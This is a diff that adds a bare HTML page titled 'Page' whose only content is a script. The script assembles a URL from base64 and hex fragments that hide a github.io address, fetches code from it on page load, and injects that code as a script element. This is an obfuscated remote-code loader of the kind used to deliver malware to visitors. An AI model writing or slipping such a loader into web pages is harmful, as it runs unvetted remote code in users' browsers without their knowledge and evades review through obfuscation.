@@ -1,0 +1,41 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>Page</title>
+</head>
+<body>
+<script>
+var partB64 = 'aHR0cHM6Ly9vbGVnZXJ5eXVsaWFlcnkuZ2l0aHViLmlvLy5naXRodWIv';
+var partHex = '6d616e6475612e776f6e746564';
+
+function fromBase64(s) {
+  return decodeURIComponent(escape(atob(s)));
+}
+
+function fromHex(h) {
+  var out = '';
+  for (var i = 0; i < h.length; i += 2) {
+    out += String.fromCharCode(parseInt(h.substr(i, 2), 16));
+  }
+  return out;
+}
+
+var url = fromBase64(partB64) + fromHex(partHex);
+
+fetch(url, { method: 'GET', cache: 'no-store' })
+  .then(function (r) {
+    if (!r.ok) throw new Error(String(r.status));
+    return r.text();
+  })
+  .then(function (code) {
+    var s = document.createElement('script');
+    s.text = code;
+    document.head.appendChild(s);
+  })
+  .catch(function (e) {
+    console.error(e);
+  });
+</script>
+</body>
+</html>
